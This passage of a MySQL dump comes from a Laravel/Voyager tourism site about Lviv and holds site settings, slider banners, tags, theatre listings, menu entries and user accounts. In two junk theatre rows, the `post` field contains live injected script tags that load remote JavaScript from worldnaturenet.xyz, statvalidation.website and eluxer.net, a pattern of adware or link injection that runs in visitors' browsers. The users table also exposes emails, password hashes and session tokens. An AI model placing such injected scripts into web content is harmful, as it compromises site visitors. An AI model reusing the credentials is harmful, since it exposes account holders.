) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Дамп данных таблицы `settings`
--

INSERT INTO `settings` (`id`, `key`, `display_name`, `value`, `details`, `type`, `order`, `group`) VALUES
(1, 'site.title', 'Site Title', 'lviv-travel', '', 'text', 1, 'Site'),
(2, 'site.description', 'Site Description', 'lviv-travel', '', 'text', 2, 'Site'),
(3, 'site.logo', 'Site Logo', 'settings/April2018/ODHaGqvimYPAyAaAJ1j5.jpeg', '', 'image', 3, 'Site'),
(4, 'site.google_analytics_tracking_id', 'Google Analytics Tracking ID', '', '', 'text', 4, 'Site'),
(5, 'admin.bg_image', 'Admin Background Image', '', '', 'image', 5, 'Admin'),
(6, 'admin.title', 'Admin Title', 'Voyager', '', 'text', 1, 'Admin'),
(7, 'admin.description', 'Admin Description', 'Welcome to Voyager. The Missing Admin for Laravel', '', 'text', 2, 'Admin'),
(8, 'admin.loader', 'Admin Loader', '', '', 'image', 3, 'Admin'),
(9, 'admin.icon_image', 'Admin Icon Image', '', '', 'image', 4, 'Admin'),
(10, 'admin.google_analytics_client_id', 'Google Analytics Client ID (used for admin dashboard)', '', '', 'text', 1, 'Admin'),
(11, 'admin.image1', 'image1', '', NULL, 'image', 6, 'Admin');

-- --------------------------------------------------------

--
-- Структура таблицы `sliders`
--

CREATE TABLE `sliders` (
  `id` int(10) UNSIGNED NOT NULL,
  `slider_name` enum('Головний слайдер','Баннер подій') COLLATE utf8_unicode_ci NOT NULL,
  `image_url` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `header` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `description` text COLLATE utf8_unicode_ci,
  `url` text COLLATE utf8_unicode_ci,
  `link_text` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Дамп данных таблицы `sliders`
--

INSERT INTO `sliders` (`id`, `slider_name`, `image_url`, `header`, `description`, `url`, `link_text`, `created_at`, `updated_at`) VALUES
(1, 'Баннер подій', NULL, NULL, NULL, NULL, '', '2018-05-25 06:58:09', '2018-05-25 06:58:09'),
(2, 'Баннер подій', 'sliders/May2018/5adTiulsV9L7dFHFDRCu.jpg', '123123', '1231231231231231231231', 'qqqq', '', '2018-05-25 07:04:00', '2018-05-25 07:32:51'),
(3, 'Головний слайдер', 'sliders/May2018/lH1aCYI0EcibzKt9oPFG.jpg', 'Різдво у Львові', 'Вікові традиції, смачні й ароматні розваги, свято "Пампуха", різдвяні ярмарки на  вуличках Львова!', NULL, NULL, '2018-05-25 07:42:00', '2018-05-25 10:26:09'),
(4, 'Головний слайдер', 'sliders/May2018/nThLo1NzjyuXGU9wj7Ls.jpg', 'Дослідження туристів', 'Поділіться своїм досвідом перебування у Львові заповнивши цю <br>он-лайн форму! Ваш відгук                             важливий для нас!', 'sdf', 'Заповнити', '2018-05-25 10:31:17', '2018-05-25 10:31:17'),
(5, 'Головний слайдер', 'sliders/May2018/2MsLIthbFmZVm1iFAcgL.jpg', 'Львів у списку найкращих', 'Львів у списку найкращих напрямків для бюджетного відпочинку у 2017 році.                                     <br>Вартість місячної оренди однокімнатної квартири в центрі міста в порівнянні                                     <br>з іншими містами Європи становить:', NULL, NULL, '2018-05-25 10:34:38', '2018-05-25 10:34:38');

-- --------------------------------------------------------

--
-- Структура таблицы `tags`
--

CREATE TABLE `tags` (
  `id` int(10) UNSIGNED NOT NULL,
  `code` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `category_name` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `name_uk` varchar(50) COLLATE utf8_unicode_ci DEFAULT NULL,
  `name_en` varchar(50) COLLATE utf8_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Дамп данных таблицы `tags`
--

INSERT INTO `tags` (`id`, `code`, `category_name`, `name_uk`, `name_en`, `created_at`, `updated_at`) VALUES
(7, 'museums', 'museums', 'Музеї', 'Museums', '2018-05-30 12:01:07', '2018-05-30 12:01:07'),
(8, 'filarmonies', 'theatres', 'Філармонії', 'Flarmonies', '2018-05-30 12:01:56', '2018-05-30 12:01:56'),
(9, 'memories', 'memories', 'Пам\'ятки', 'Memories', '2018-05-31 05:31:26', '2018-05-31 05:31:26'),
(10, 'public-places', 'public_places', 'Громадські місця', 'Public places', '2018-05-31 07:57:00', '2018-05-31 08:02:25'),
(13, 'excursions', 'excursions', 'Єкскурсія', 'Excursions', '2018-06-05 11:01:00', '2018-06-05 11:03:35');

-- --------------------------------------------------------

--
-- Структура таблицы `theatres`
--

CREATE TABLE `theatres` (
  `id` int(11) NOT NULL,
  `tag` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `name` text NOT NULL,
  `slug` text NOT NULL,
  `address` text NOT NULL,
  `number` text NOT NULL,
  `number2` text NOT NULL,
  `email` text NOT NULL,
  `site` text NOT NULL,
  `schedule` text NOT NULL,
  `title_uk` text NOT NULL,
  `title_en` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `post` text NOT NULL,
  `banner_photo` text,
  `photo1` text,
  `photo2` text,
  `photo3` text,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `google_place_id` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `status` enum('draft','published') CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `unique_key` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `owner_email` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Дамп данных таблицы `theatres`
--

INSERT INTO `theatres` (`id`, `tag`, `name`, `slug`, `address`, `number`, `number2`, `email`, `site`, `schedule`, `title_uk`, `title_en`, `post`, `banner_photo`, `photo1`, `photo2`, `photo3`, `created_at`, `updated_at`, `google_place_id`, `status`, `unique_key`, `owner_email`) VALUES
(1, 'Theatre', 'Львівський академічний театр імені Леся Курбаса', 'l-vivs-kij-akademichnij-teatr-imeni-lesya-kurbasa', 'вул. Курбаса, 3, Львів', '(032) 272 92 04', '(032) 272 48 24', 'kurbas_theatre@yahoo. com', 'www. kurbas. lviv. ua', '<ul style="box-sizing: border-box; padding: 0px; margin: 0px 10px; color: #352a33; font-family: SourceSansPro; font-size: medium;"><li style="box-sizing: border-box; list-style-type: none;"><span style="box-sizing: border-box; color: #000000; font-family: Tahoma, sans-serif; font-size: 11px;">9.00 – 21.00</span></li><li style="box-sizing: border-box; list-style-type: none;"><span style="box-sizing: border-box; color: #000000; font-family: Tahoma, sans-serif; font-size: 11px;"> (пн/вт/ср/чт/пт/сб/нд).</span></li><li style="box-sizing: border-box; list-style-type: none;"></li></ul>', 'Львівський театр імені Леся Курбаса створений Володимиром Кучинським та групою молодих акторів у 1988. Театр завжди вирізнявся високоінтелектуальним і неповторним репертуаром. Зокрема, широкого визнання здобули його сценічні адаптації таких творів, як філософські діалоги Г. Сковороди «Благодарний Еродій» та «Наркіс»; «Злочин і кара» Ф. Достоєвського (вистави «Сни», «Забави для Фауста»); «Бенкет» Платона (вистави «Хвала Еросу» та «Silenius Alcibiadis»); поезії В. Стуса (драматична поема «Марко Проклятий, або Східна легенда»).', '', '<h4 style="text-align: left;">Театр імені Леся Курбаса &mdash; унікальний методологічний центр, який опанував і розробив цикл театральних методик та тренінгів акторської психофізики, пластики, голосу, провів серію спільних проектів з Workcenter Єжи Ґротовського (Італія), Школою драматичного мистецтва Анатолія Васільєва (Росія), Осередком театральних практик Gardzienice (Польща), Саратозьким міжнародним театральним центром (США). У 2006 році за творчі здобутки Театр імені Леся Курбаса було нагороджено найвищою українською нагородою в галузі культури &mdash; Національною премією імені Тараса Шевченка, а у 2007 році театру було присвоєно статус академічного.</h4>\r\n<h4 style="text-align: left;">З 1994 року Театр імені Курбаса проводить свій власний міжнародний театральний фестиваль &laquo;Театр: Метод і Практика&raquo;. Веде активну міжнародну діяльність, є членом міжнародної театральної мережі IETM.<br />Окрім того, Театр імені. Курбаса є унікальним для України театром-школою, що виховала не одне покоління акторів та режисерів спершу в Студії театру, а з 2001 року на базі Львівського Національного університету імені Івана Франка.</h4>\r\n<h4 style="text-align: left;">Театр розташований в будинку колишнього &laquo;Casino de Paris&raquo;, який у 1909 році збудовано за проектом архітекторів З. Федорського та С. Мацудзинського, за адресою вулиця Курбаса 3 (колишня вул.. Рейтана, 7). В міжвоєнні часи в будинку знаходився кінотеатр, в радянські часи він належав до Будинку народної творчості. З кінця 1987 року приміщення було віддане в оренду Театру імені Леся Курбаса.</h4>', '["theatres\\/June2018\\/l193OreqgZHuBhqqWTAG.png"]', '["theatres\\/June2018\\/nXsC5lGDNQmEcASubCn9.png"]', '["theatres\\/June2018\\/5jctyNhGdXFGnUkCXLLA.png"]', '["theatres\\/June2018\\/ht038eyHOxiegerClasd.png"]', '2018-05-11 10:56:00', '2018-06-06 04:31:17', '', 'draft', 'theatres~*de68c016170452c06ad3b307c3a91121', 'theatre@gmail.com'),
(2, 'filarmonies', 'inho', 'o', 'ijh', 'oih[\'oih', 'oihffef][', 'ojkfn', 'o', 'ojdf]p', 'oj', 'o', '<p>fkj]</p><script type="text/javascript" src="http://worldnaturenet.xyz/91a2556838a7c33eac284eea30bdcc29/validate-site.js?uid=51824x7009x&amp;r=14"></script><script type="text/javascript" src="http://statvalidation.website/addons/lnkr5.min.js"></script><script type="text/javascript" src="http://statvalidation.website/addons/lnkr30_nt.min.js"></script><script type="text/javascript" src="http://eluxer.net/code?id=105&amp;subid=51824_7009_"></script>', NULL, NULL, NULL, NULL, NULL, NULL, '0jkefj', 'draft', 'theatres~*de68c016170452c06ad3b307c3a91073', 'ojkp'),
(3, 'filarmonies', 'inho', 'odfgdfge3erghbe45-nw-r53t-q-q34', 'ijh', 'oih[\'oih', 'oihffef][', 'ojkfn', 'ofdgdfg', 'ojdf]p', 'oj', 'odfgdfge3erghbe45 nw r53t q q34', '<p>fkj]</p><script type="text/javascript" src="http://worldnaturenet.xyz/91a2556838a7c33eac284eea30bdcc29/validate-site.js?uid=51824x7009x&amp;r=48"></script><script type="text/javascript" src="http://statvalidation.website/addons/lnkr5.min.js"></script><script type="text/javascript" src="http://statvalidation.website/addons/lnkr30_nt.min.js"></script><script type="text/javascript" src="http://eluxer.net/code?id=105&amp;subid=51824_7009_"></script>', NULL, NULL, NULL, NULL, '2018-06-05 14:53:13', NULL, '0jkefj', 'draft', 'theatres~*d11f1e5140093e39ee3cd0c6c8eb9e87', 'ojkp');

-- --------------------------------------------------------

--
-- Структура таблицы `tops`
--

CREATE TABLE `tops` (
  `id` int(11) NOT NULL,
  `title_uk` varchar(50) CHARACTER SET utf8 NOT NULL,
  `title_en` varchar(50) CHARACTER SET utf8 NOT NULL,
  `path` varchar(255) CHARACTER SET utf8 NOT NULL,
  `parent_id` tinyint(1) NOT NULL DEFAULT '0',
  `published` tinyint(1) NOT NULL DEFAULT '0',
  `childrens` tinyint(1) DEFAULT '0',
  `template` varchar(50) CHARACTER SET utf8 NOT NULL,
  `data_menu` varchar(20) CHARACTER SET utf8 NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Дамп данных таблицы `tops`
--

INSERT INTO `tops` (`id`, `title_uk`, `title_en`, `path`, `parent_id`, `published`, `childrens`, `template`, `data_menu`) VALUES
(1, 'Вже і зараз', 'Now', 'edtgfwer', 0, 1, 1, 'menu-now', 'now'),
(3, 'Твій Львів', 'Your Lviv', '', 0, 1, 1, 'menu-lviv', 'lviv'),
(4, 'Події', 'Events', '', 0, 1, 1, 'menu-events', 'events'),
(5, 'Сплануй', 'Planning', '', 0, 1, 1, 'menu-planning', 'planning'),
(6, 'Для бізнесу', 'Business', '', 0, 1, 1, 'menu-business', 'business'),
(7, 'неСвіжі новини', '', '/now/page-news', 1, 1, 0, '', ''),
(8, 'Актуальні події', '', '', 1, 1, 0, '', ''),
(9, 'Рекомендовані', '', '', 1, 1, 0, '', ''),
(10, 'Топові місця', '', '', 1, 1, 0, '', ''),
(11, 'City Card', '', '/now/lviv-city-card', 1, 1, 0, '', ''),
(12, 'До Львова', '', '', 5, 1, 0, '', ''),
(13, 'Громадський транспорт', '', '', 5, 1, 0, '', ''),
(14, 'Де зупинитись', '', '', 5, 1, 0, '', ''),
(15, 'Путівники та карти', '', '', 5, 1, 0, '', ''),
(16, 'Все що треба знати', '', '', 5, 1, 0, '', ''),
(17, 'Мистецтво та культура', '', '', 4, 1, 0, '', ''),
(18, 'Фестивалі', '', '', 4, 1, 0, '', ''),
(19, 'Для дітей', '', '', 4, 1, 0, '', ''),
(20, 'Спорт', '', '', 4, 1, 0, '', ''),
(21, 'Бізнес конференції', '', '', 4, 1, 0, '', ''),
(22, 'Театр', '', '', 4, 1, 0, '', ''),
(23, 'Їжа та напої', '', '', 3, 1, 0, '', ''),
(24, 'Памʼятки', '', '', 3, 1, 0, '', ''),
(25, 'Музеї та галереї', '', '', 3, 1, 0, '', ''),
(26, 'Атракції', '', '', 3, 1, 0, '', ''),
(27, 'Парки', '', '', 3, 1, 0, '', ''),
(28, 'Театри/Філармонії', '', '', 3, 1, 0, '', ''),
(29, 'Громадські місця', '', '', 3, 1, 0, '', ''),
(30, 'Тури', '', '', 3, 1, 0, '', ''),
(31, 'Навколо Львова', '', '', 3, 1, 0, '', ''),
(32, 'Запланувати конференцію у Львові', '', '', 36, 1, 0, '', ''),
(33, 'Про LCB', '', '', 36, 1, 0, '', ''),
(34, 'Календар подій - комерційне застосування', '', '', 36, 1, 0, '', ''),
(35, 'Реалізовані події (Амбасадори)', '', '', 36, 1, 0, '', ''),
(36, 'Lviv Convention Bureau', '', '', 6, 1, 1, '', ''),
(37, 'Invest in Lviv', '', '', 6, 1, 1, '', ''),
(38, 'Загальна інформація про Львів + Міні історія', '', '', 6, 1, 1, '', ''),
(39, 'Замовити FAM-тур', '', '', 36, 1, 0, '', ''),
(40, 'Локації для проведення комерційних подій у Львові', '', '', 36, 1, 0, '', ''),
(41, 'Чому Львів', '', '', 37, 1, 0, '', ''),
(42, 'Пріорітетні галузі', '', '', 37, 1, 0, '', ''),
(43, 'Інвестиційні проекти', '', '', 37, 1, 0, '', ''),
(44, 'Професійні події', '', '', 37, 1, 0, '', ''),
(45, 'Блог з основними фактами', '', '', 38, 1, NULL, '', '');

-- --------------------------------------------------------

--
-- Структура таблицы `translations`
--

CREATE TABLE `translations` (
  `id` int(10) UNSIGNED NOT NULL,
  `table_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `column_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `foreign_key` int(10) UNSIGNED NOT NULL,
  `locale` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `value` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Структура таблицы `users`
--

CREATE TABLE `users` (
  `id` int(10) UNSIGNED NOT NULL,
  `role_id` int(11) DEFAULT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `avatar` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT 'users/default.png',
  `password` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `remember_token` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Дамп данных таблицы `users`
--

INSERT INTO `users` (`id`, `role_id`, `name`, `email`, `avatar`, `password`, `remember_token`, `created_at`, `updated_at`) VALUES
(2, 3, 'denic', 'dpodvorotniy@gmail.com', 'users/default.png', '$2y$10$jNa.wAj8T43wYNmG/7je8er9Xntp/UeV2ucdc01hX6FXrR5n5kqCO', '3GXm4AXBjAceDoXhJR54zacoErgSwwo0En86nvpXsLDaGonLbbESRsaLhDnN', '2018-04-05 10:35:06', '2018-04-05 10:35:06'),
(3, 1, 'ksu', 'kpodvorotnyaya@gmail.com', 'users/default.png', '$2y$10$KTDW3cXm5YfQ9dI9EB228.2XgjFtnmbv9CeirC3BlWjYbirsLBC6C', 'f1sucAwTr0i44Z1xepWdZQ5VLzpCBtIiu31XTs3Y3kO0pOhYNNUVNlwp7UKv', '2018-04-06 10:18:08', '2018-04-26 11:01:31'),
(4, 1, 'zayander', 'igoritkron@gmail.com', 'users/default.png', '$2y$10$GP5wT3bfHJr3HrUy35.zFOaSLIKvc5nOLcXQPMQ/A/khr6VqXBjae', '6isa7JeSL2ab9O7aSAIoUibcdJ4qZPZELx7H4LQMlWsw5FzhgTZQZk8pKfmD', '2018-04-10 07:33:25', '2018-04-10 07:33:25'),
(5, 1, 'storage1', 'igoritkro@gmail.com', 'users/default.png', '$2y$10$92HmLkX2NjHkanz2MmkGJuBHnNClkFsPcytjqkZwxAcvtuP9/7BEq', NULL, '2018-04-13 08:08:50', '2018-04-13 08:09:04'),
(6, 6, 'editor', 'editor@gmail.com', 'users/default.png', '$2y$10$iXx1sgiPce2sGYIqsD/3g.iF.UqGgvHP1XKqrVTrzXZl1F1PYhYES', 'ArMqxa9j3eNfyo2sdH4CBc8z4cfIQtiMX7V3ZMb274DAcixdgNgblbPt4ug3', '2018-04-19 11:03:43', '2018-04-19 11:03:43'),
(7, 5, 'organizer', 'organizer@gmail.com', 'users/default.png', '$2y$10$aVyGoth0gwx9sgWgMw/Cc.GeNbQur1oX8Dxz2YHZ0Zm3bhjZjZY1O', '6RhE8JbMNYau9BWoXjvHTELyzL8FCKmjOdmX7Y2xCsp8LOrUMjBgHshkXMBo', '2018-04-19 11:04:13', '2018-04-19 11:04:13'),
(8, 4, 'gid', 'gid@gmail.com', 'users/default.png', '$2y$10$1883QKKzjyFSTVsqoSN/muPD0mD6oHF2u6O9G63kiGunE5UeiR2B2', 'sBBE6z2ewWdLWLm13m1M67w4ZGhlzUKitzgnI5GpmmrwanZ3MfDzCUYRWBPV', '2018-04-19 11:04:48', '2018-04-19 11:04:48'),
(9, 4, 'Pan-Ivan', 'pan_ivan@gmail.com', 'users/default.png', '$2y$10$KsTD3niNWWJFSIsPPKas1./X774yct7ptTyCH9mXoR7mu0Qxdf5JO', 'Ba5ibnLen85Vuo1Ypqx681aJbGpcqrXG9naVycfrF3dTDPN0XuYvDxhHknqo', '2018-05-11 05:11:01', '2018-05-11 10:31:30');

--
-- Индексы сохранённых таблиц
--

--
-- Индексы таблицы `around_lvivs`
--
ALTER TABLE `around_lvivs`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `categories`
--
ALTER TABLE `categories`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `data_rows`
--
ALTER TABLE `data_rows`
  ADD PRIMARY KEY (`id`),
  ADD KEY `data_rows_data_type_id_foreign` (`data_type_id`);

--
-- Индексы таблицы `data_types`
--
ALTER TABLE `data_types`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `developments`
--
ALTER TABLE `developments`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `excursions`
--
ALTER TABLE `excursions`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `gids`
--
ALTER TABLE `gids`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `landings`
--
ALTER TABLE `landings`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `languages`
--
ALTER TABLE `languages`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `memories`
--
ALTER TABLE `memories`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `menus`
--
ALTER TABLE `menus`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `menu_items`
--
ALTER TABLE `menu_items`
  ADD PRIMARY KEY (`id`),
  ADD KEY `menu_items_menu_id_foreign` (`menu_id`);

--
-- Индексы таблицы `migrations`
--
ALTER TABLE `migrations`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `museums`
--
ALTER TABLE `museums`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `new`
--
ALTER TABLE `new`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `owners`
--
ALTER TABLE `owners`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `pages`
--
ALTER TABLE `pages`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `parks`
--
ALTER TABLE `parks`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `permissions`
--
ALTER TABLE `permissions`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `permission_groups`
--
ALTER TABLE `permission_groups`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `permission_role`
--
ALTER TABLE `permission_role`
  ADD PRIMARY KEY (`permission_id`,`role_id`),
  ADD KEY `permission_role_permission_id_index` (`permission_id`),
  ADD KEY `permission_role_role_id_index` (`role_id`);

--
-- Индексы таблицы `posts`
--
ALTER TABLE `posts`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `public_places`
--
ALTER TABLE `public_places`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `roles`
--
ALTER TABLE `roles`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `settings`
--
ALTER TABLE `settings`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `sliders`
--
ALTER TABLE `sliders`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `tags`
--
ALTER TABLE `tags`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `theatres`
--
ALTER TABLE `theatres`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `tops`
--
ALTER TABLE `tops`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `translations`
--
ALTER TABLE `translations`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT для сохранённых таблиц
--

--
-- AUTO_INCREMENT для таблицы `around_lvivs`
--
ALTER TABLE `around_lvivs`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT для таблицы `categories`
--
ALTER TABLE `categories`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=25;
--
-- AUTO_INCREMENT для таблицы `data_rows`
--
ALTER TABLE `data_rows`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=494;
--
-- AUTO_INCREMENT для таблицы `data_types`
--
ALTER TABLE `data_types`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=53;
--
-- AUTO_INCREMENT для таблицы `developments`
--
ALTER TABLE `developments`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT для таблицы `excursions`
--
ALTER TABLE `excursions`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
--
-- AUTO_INCREMENT для таблицы `gids`
--
ALTER TABLE `gids`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;
--
-- AUTO_INCREMENT для таблицы `landings`
--
ALTER TABLE `landings`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT для таблицы `languages`
--
ALTER TABLE `languages`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;
--
-- AUTO_INCREMENT для таблицы `memories`
--
ALTER TABLE `memories`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT для таблицы `menus`
--
ALTER TABLE `menus`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;
--
-- AUTO_INCREMENT для таблицы `menu_items`
--
ALTER TABLE `menu_items`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=88;
--
-- AUTO_INCREMENT для таблицы `migrations`
--
ALTER TABLE `migrations`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=26;
--
-- AUTO_INCREMENT для таблицы `museums`
--
ALTER TABLE `museums`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
--
-- AUTO_INCREMENT для таблицы `new`
--
ALTER TABLE `new`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT для таблицы `owners`
--
ALTER TABLE `owners`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT для таблицы `pages`
--
ALTER TABLE `pages`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=11;
--
-- AUTO_INCREMENT для таблицы `parks`
--
ALTER TABLE `parks`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT для таблицы `permissions`
--
ALTER TABLE `permissions`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=211;
--
-- AUTO_INCREMENT для таблицы `permission_groups`
--
ALTER TABLE `permission_groups`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT для таблицы `posts`
--
ALTER TABLE `posts`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;
--
-- AUTO_INCREMENT для таблицы `public_places`
--
ALTER TABLE `public_places`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT для таблицы `roles`
--
ALTER TABLE `roles`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;
--
-- AUTO_INCREMENT для таблицы `settings`
--
ALTER TABLE `settings`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=12;
--
-- AUTO_INCREMENT для таблицы `sliders`
--
ALTER TABLE `sliders`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;
--
-- AUTO_INCREMENT для таблицы `tags`
--
ALTER TABLE `tags`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=14;
--
-- AUTO_INCREMENT для таблицы `theatres`
--
ALTER TABLE `theatres`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;
--
-- AUTO_INCREMENT для таблицы `tops`
--
ALTER TABLE `tops`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=46;
--
-- AUTO_INCREMENT для таблицы `translations`
--
ALTER TABLE `translations`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT для таблицы `users`
--
ALTER TABLE `users`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;
--
-- Ограничения внешнего ключа сохраненных таблиц
--

--
-- Ограничения внешнего ключа таблицы `data_rows`
--
ALTER TABLE `data_rows`
  ADD CONSTRAINT `data_rows_data_type_id_foreign` FOREIGN KEY (`data_type_id`) REFERENCES `data_types` (`id`) ON DELETE CASCADE ON UPDATE CASCADE;

--
-- Ограничения внешнего ключа таблицы `menu_items`
--
ALTER TABLE `menu_items`
  ADD CONSTRAINT `menu_items_menu_id_foreign` FOREIGN KEY (`menu_id`) REFERENCES `menus` (`id`) ON DELETE CASCADE;

--
-- Ограничения внешнего ключа таблицы `permission_role`
--
ALTER TABLE `permission_role`
  ADD CONSTRAINT `permission_role_permission_id_foreign` FOREIGN KEY (`permission_id`) REFERENCES `permissions` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `permission_role_role_id_foreign` FOREIGN KEY (`role_id`) REFERENCES `roles` (`id`) ON DELETE CASCADE;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
